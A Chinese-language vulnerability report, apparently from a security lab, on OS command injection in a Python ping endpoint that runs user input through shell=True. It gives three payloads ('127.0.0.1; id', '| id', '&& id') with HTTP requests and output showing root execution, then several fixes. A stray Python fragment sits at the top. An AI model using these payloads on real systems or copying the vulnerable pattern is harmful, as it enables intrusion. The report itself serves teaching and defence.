import subprocess

def ping():
    result = None

## 3. 漏洞检测及修复建议

### CI-001：命令注入（分号分隔）

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | CI-001 |
| **漏洞名称** | 命令注入 — 分号 `;` 分隔多条命令 |
| **漏洞类型** | OS 命令注入（OS Command Injection） |
| **CWE 编号** | CWE-78：Improper Neutralization of Special Elements used in an OS Command |
| **OWASP 分类** | A03:2021 – Injection |
| **风险等级** | 🔴 **严重** |
| **漏洞位置** | `app.py` 第 ×× 行 `f"ping -c 3 {ip}"` + `shell=True` |

#### 漏洞代码

```python
cmd = f"ping -c 3 {ip}"                           # ← f-string 拼接用户输入
output = subprocess.check_output(cmd, shell=True,  # ← shell=True 启用 shell 解析
                                  timeout=30, stderr=subprocess.STDOUT)
```

#### 漏洞详情

`subprocess.check_output(cmd, shell=True)` 将命令字符串交给系统 shell（`/bin/sh`）执行。当用户输入的 `ip` 中包含 `;`、`|`、`&&` 等 shell 特殊字符时，攻击者可以在正常 ping 命令后注入任意系统命令。由于服务以 root 权限运行，注入的命令也以 root 权限执行。

#### 攻击演示

##### 攻击向量 1：分号注入（最常用）

| 属性 | 内容 |
|:-----|:------|
| **攻击 Payload** | `127.0.0.1; id` |
| **实际执行命令** | `ping -c 3 127.0.0.1; id` |
| **攻击结果** | ✅ 成功执行 `id` 命令 |

**攻击请求**：
```
POST /ping HTTP/1.1
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%3Bid
```

**生成的 shell 命令**：
```bash
ping -c 3 127.0.0.1; id
```

**攻击结果**（成功 ✅）：
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.028ms
...
--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
uid=0(root) gid=0(root) groups=0(root)    ← 命令注入成功！
```

### CI-002：命令注入（管道符）

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | CI-002 |
| **漏洞名称** | 命令注入 — 管道符 `\|` 分隔命令 |
| **漏洞类型** | OS 命令注入（OS Command Injection） |
| **CWE 编号** | CWE-78：Improper Neutralization of Special Elements used in an OS Command |
| **OWASP 分类** | A03:2021 – Injection |
| **风险等级** | 🔴 **严重** |
| **漏洞位置** | `app.py` 第 ×× 行 `f"ping -c 3 {ip}"` + `shell=True` |

#### 漏洞代码

```python
cmd = f"ping -c 3 {ip}"
output = subprocess.check_output(cmd, shell=True, timeout=30, stderr=subprocess.STDOUT)
```

#### 漏洞详情

管道符 `|` 在 Linux shell 中将前一个命令的输出作为后一个命令的输入。当 `ip` 中包含 `|` 时，shell 将管道符后的内容解释为新命令。与分号注入不同，管道注入会**丢弃正常 ping 命令的输出**，仅显示注入命令的执行结果。

#### 攻击演示

| 属性 | 内容 |
|:-----|:------|
| **攻击 Payload** | `127.0.0.1 \| id` |
| **实际执行命令** | `ping -c 3 127.0.0.1 \| id` |
| **攻击结果** | ✅ 成功执行（仅显示 uid=0，ping 输出被丢弃） |

**攻击请求**：
```
POST /ping HTTP/1.1
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1+|+id
```

**生成的 shell 命令**：
```bash
ping -c 3 127.0.0.1 | id
```

**攻击结果**（成功 ✅）：
```
uid=0(root) gid=0(root) groups=0(root)
```

> （在此处输入管道符注入的页面截图——仅显示 uid=0，无 ping 输出）

### CI-003：命令注入（逻辑与）

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | CI-003 |
| **漏洞名称** | 命令注入 — 逻辑与 `&&` 分隔命令 |
| **漏洞类型** | OS 命令注入（OS Command Injection） |
| **CWE 编号** | CWE-78：Improper Neutralization of Special Elements used in an OS Command |
| **OWASP 分类** | A03:2021 – Injection |
| **风险等级** | 🔴 **严重** |
| **漏洞位置** | `app.py` 第 ×× 行 `f"ping -c 3 {ip}"` + `shell=True` |

#### 漏洞代码

```python
cmd = f"ping -c 3 {ip}"
output = subprocess.check_output(cmd, shell=True, timeout=30, stderr=subprocess.STDOUT)
```

#### 漏洞详情

逻辑与 `&&` 的语义是：**仅当前一条命令成功（退出码 0）后，才执行后一条命令**。`ip` 中包含 `&&` 时，先执行 ping，成功后再执行注入命令。ping 和注入命令的输出都会显示。

#### 攻击演示

| 属性 | 内容 |
|:-----|:------|
| **攻击 Payload** | `127.0.0.1 && id` |
| **实际执行命令** | `ping -c 3 127.0.0.1 && id` |
| **攻击结果** | ✅ 成功执行（ping 成功后执行 id） |

**攻击请求**：
```
POST /ping HTTP/1.1
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1+%26%26+id
```

**生成的 shell 命令**：
```bash
ping -c 3 127.0.0.1 && id
```

**攻击结果**（成功 ✅）：
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.028ms
...
--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
uid=0(root) gid=0(root) groups=0(root)
```

### 修复建议

#### 修复方案一：使用 shlex.quote() 转义用户输入

```python
import shlex

ip = request.form.get("ip", "").strip()
safe_ip = shlex.quote(ip)                       # ✅ 转义特殊字符
cmd = f"ping -c 3 {safe_ip}"                    # 拼接转义后的参数
output = subprocess.check_output(cmd, shell=True, timeout=30, stderr=subprocess.STDOUT)
```

#### 修复方案二：使用参数列表方式（推荐）

```python
# ✅ 使用参数列表，不经过 shell 解析
ip = request.form.get("ip", "").strip()
cmd = ["ping", "-c", "3", ip]                   # 参数列表，无 shell 注入
output = subprocess.check_output(cmd, timeout=30, stderr=subprocess.STDOUT)
# 注意：此方案不需要 shell=True
```

#### 修复方案三：输入校验 + 白名单

```python
import re

ip = request.form.get("ip", "").strip()
# ✅ 只允许 IP 地址或合法域名
if not re.match(r'^[a-zA-Z0-9.-]+$', ip):
    return render_template("ping.html", error="无效的 IP 地址或域名格式")
```

#### 修复前后代码对比

```python
# ❌ 修复前（漏洞代码）
cmd = f"ping -c 3 {ip}"            # f-string 直接拼接用户输入
output = subprocess.check_output(cmd, shell=True, ...)  # shell=True

# ✅ 修复后（安全代码 - 方案二）
cmd = ["ping", "-c", "3", ip]      # 参数列表
output = subprocess.check_output(cmd, timeout=30, ...)  # 无 shell=True
```
